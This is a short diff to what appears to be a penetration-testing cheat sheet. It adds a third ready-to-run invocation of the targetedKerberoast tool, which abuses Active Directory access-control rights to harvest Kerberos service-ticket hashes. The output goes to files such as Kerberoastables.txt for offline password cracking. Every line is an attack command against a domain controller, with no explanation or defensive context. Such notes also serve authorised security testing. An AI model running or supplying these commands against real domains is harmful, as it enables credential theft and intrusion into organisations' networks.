@@ -1,3 +1,4 @@
 # targetedKerberoast — Kerberoast via ACL abuse
 python3 targetedKerberoast.py -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP
 python3 targetedKerberoast.py -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP -o kerberoast_hashes.txt
+targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
